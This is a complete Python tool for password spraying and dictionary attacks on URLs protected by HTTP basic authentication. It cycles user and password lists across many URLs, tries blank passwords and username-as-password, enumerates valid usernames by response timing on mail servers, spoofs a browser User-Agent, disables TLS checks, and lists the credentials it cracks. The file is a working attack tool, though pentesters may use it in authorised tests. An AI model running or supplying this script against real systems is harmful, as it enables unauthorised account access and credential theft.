#!/usr/bin/python3
# Password spray basic auth URLs

import argparse, sys, re, time, signal, requests, urllib3
import os.path
from urllib.parse import urlparse

# Turn off TLS verification warnings
urllib3.disable_warnings()

def test_login( username, password, url, proxy=None ):
  username = username.strip()
  password = password.strip()
  headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36'}
  if proxy:
    proxies = {'http': proxy, 'https': proxy}
  else:
    proxies = None

  try:
    response = requests.get( url, auth=(username, password), headers=headers, proxies=proxies, verify=False )
    if response.status_code != 401:
      return True
  except SystemExit:
    raise
  except:
    print('[!] ERROR: Request failed')
  return False

def show_found():
  global found
  if len( found ) > 0: 
    print('Found:')
    
    l = {}
    # Group by URL
    for f in found:
      if f['url'] not in l: l[f['url']] = []
      l[f['url']].append( f['user'] + ':' + f['pass'] )

    for u,creds in l.items():
      print('\n' + u + ':')
      print( ' - ' + '\n - '.join( creds ) + '\n' )

  else: print("No creds found :(") 

def cancel_handler(signal=None,frame=None):
  print("Caught ctrl-c, quitting...")
  show_found()
  sys.exit(0)

def main():
  global found, args
  signal.signal(signal.SIGINT, cancel_handler)
  parser = argparse.ArgumentParser(description="Script for password spraying basic auth URLs")
  parser.add_argument("-e", "--enumerate", action="store_true", help="Attempt time-based username enumeration")
  parser.add_argument("-c", "--credslist", help="File with list of credentials in <username>:<password> format to use")
  parser.add_argument("-u", "--user", help="Username to dictionary attack as")
  parser.add_argument("-U", "--userlist", help="Username list to dictionary attack as")
  parser.add_argument("-p", "--password", help="Password to dictionary attack as")
  parser.add_argument("-P", "--passlist", help="Password list to dictionary attack as")
  parser.add_argument("-D", "--delay", help="Delay between each attempt, in seconds")
  parser.add_argument("-s", "--same", action="store_true", help="Try password=username")
  parser.add_argument("-b", "--blank", action="store_true", help="Try blank password")
  parser.add_argument("-1", "--quitonsuccess", action="store_true", help="Stop as soon as the first credential is found")
  parser.add_argument("-n", "--noskip", action="store_true", help="Don't skip a user after finding valid creds")
  parser.add_argument("--proxy", help="URL of HTTP proxy to send requests through, e.g. http://localhost:8080")
  parser.add_argument("url", help="URL or file containing list of URLs protected by basic auth")
  args = parser.parse_args()

  if not args.url:
    parser.print_usage()
    sys.exit(2)

  print() 
  if( args.url.startswith("https://") or args.url.startswith("http://") ):
    urls = [args.url]
  else:
    # Arg is a file
    with open( args.url, 'r' ) as f:
      urls = f.read().splitlines()

  if args.delay:
    args.delay = int(args.delay)

  found = []
  queue = []
  users = []
  passwords = []
  creds = []

  # Attempt time-based username enumeration. Valid users are quicker to respond on MS mail servers
  # Inspired by: https://github.com/busterb/msmailprobe
  if ( args.user or args.userlist ) and args.enumerate:
    for url in urls:
      userlist = []
      enumerated = []
      if args.user: userlist.append(args.user)
      if args.userlist:
        with open( args.userlist, "r" ) as f:
          for u in f.read().splitlines():
            userlist.append(u)

      # Generate fake usernames
      import random, string
      fakeusers = []
      for i in range(10):
        fakeusers.append(''.join(random.choices(string.ascii_lowercase + string.digits, k=10)))

      # Determine an average response time for fake usernames
      print('Working out an average response time for invalid usernames...' )
      import time, statistics
      responsetimes = []
      for u in fakeusers:
        start = round(time.time() * 1000)
        test_login( u, 'ThisIsNotAnyonesRealPasswordIShouldHope', url )
        responsetimes.append(round(time.time() * 1000) - start)
      avgresponse = statistics.mean( responsetimes )
      print('\nAverage response time:',avgresponse,'ms')

      # Run through each user, compare to average
      for u in userlist:
        start = round(time.time() * 1000)
        test_login( u, 'ThisIsNotAnyonesRealPasswordIShouldHope', url )
        elapsed = round(time.time() * 1000) - start
        # print('Elapsed:', elapsed)

        # If it's significantly less than average, it's valid. I guess we're hard-coding the significance!
        if elapsed < (avgresponse * 0.77):
          enumerated.append( u )
          print("[+] " + u )
        else:
          print("[-] " + u )

      print('Finished enumeration on', url)
      if len( enumerated ) > 0:
        print( 'Valid users:\n\n' + '\n'.join(enumerated))
      else:
        print( 'No valid users found :(' )
  
  if (( args.user or args.userlist ) and ( args.password or args.passlist )) or args.credslist:
    
    # Check user list
    if args.userlist and not os.path.isfile(args.userlist):
      print('Couldn\'t find ' + args.userlist)
      parser.print_usage()
      sys.exit(2)

    # Check password list
    if args.passlist and not os.path.isfile(args.passlist):
      print('Couldn\'t find ' + args.passlist)
      parser.print_usage()
      sys.exit(2)
    
    # Check creds list
    if args.credslist and not os.path.isfile(args.credslist):
      print('Couldn\'t find ' + args.credslist)
      parser.print_usage()
      sys.exit(2)

  if args.user:
    users = [args.user.strip()]

  if args.userlist:
    with open( args.userlist, 'r' ) as f:
      users.extend( f.read().splitlines() )
  
  if args.password:
    passwords = [args.password.strip()]

  if args.passlist:
    with open( args.passlist, 'r' ) as f:
      passwords.extend( f.read().splitlines() )

  if args.credslist:
    with open( args.credslist, 'r' ) as f:
      for line in f.read().splitlines():
        if line == '':
          continue
        c = line.split(':')
        if len( c ) < 2:
          print('No username / pass combination in: ' + line)
          continue
        creds.append({ 'user':c[0], 'pass':':'.join(c[1:]) })
   
  # Loop in the order users, urls, passwords
  # i.e.
  # url1,user1,password1
  # url1,user2,password1
  # url1,user3,password1
  # url2,user1,password1
  # url2,user2,password1
  # url2,user3,password1
  # url3,user1,password1
  # url3,user2,password1
  # url3,user3,password1
  # url1,user1,password2
  # url1,user2,password2
  # url1,user3,password2
  # url2,user1,password2
  # url2,user2,password2
  # url2,user3,password2
  # url3,user1,password2
  # url3,user2,password2
  # url3,user3,password2
  # url1,user1,password3
  # url1,user2,password3
  # url1,user3,password3
  # url2,user1,password3
  # url2,user2,password3
  # url2,user3,password3
  # url3,user1,password3
  # url3,user2,password3
  # url3,user3,password3

  # Compile queue
  for url in urls:
    for cred in creds:
      item = cred
      item["url"] = url
      queue.append(item)
    
    for user in users:
      
      # password = username
      if args.same:
        queue.append({ "url":url, "user":user, "pass":user })
          
      # blank password
      if args.blank:
        queue.append({ "url":url, "user":user, "pass":""})


  for pw in passwords:
    for url in urls:
      for user in users:
        queue.append({ "url": url, "user": user, "pass": pw })
 
  foundusers = []

  print('Generated request queue of '+str(len(queue))+' items')
  count = 1

  for item in queue:
    skip = False
    
    print('['+str(count)+'/'+str(len(queue))+'] ',end='')
    count+=1

    # Check they're not already found
    if not args.noskip:
      for f in found:
        if f["user"] == item["user"] and f["url"] == item["url"]:
          print('[-] Skipping already found user:' + item['user'] + ' for ' + item['url'])
          skip = True

      if skip:
        continue

    # Test login
    print("[*] Testing " + item['user'] + " : " + item['pass'] + " ("+item['url']+")") 
    if test_login( item["user"], item["pass"], item["url"], args.proxy ):
      print("[+] FOUND: " + item['user'] + " : " + item['pass'] + ' ('+item['url']+')')
      found.append( item )
      
      # Quit on first found credential
      if args.quitonsuccess:
        show_found()
        sys.exit(0)
        
    # Rate limiting
    if args.delay:
      time.sleep(args.delay)
  
  show_found()

  print("Done")

if __name__ == '__main__':
  main()
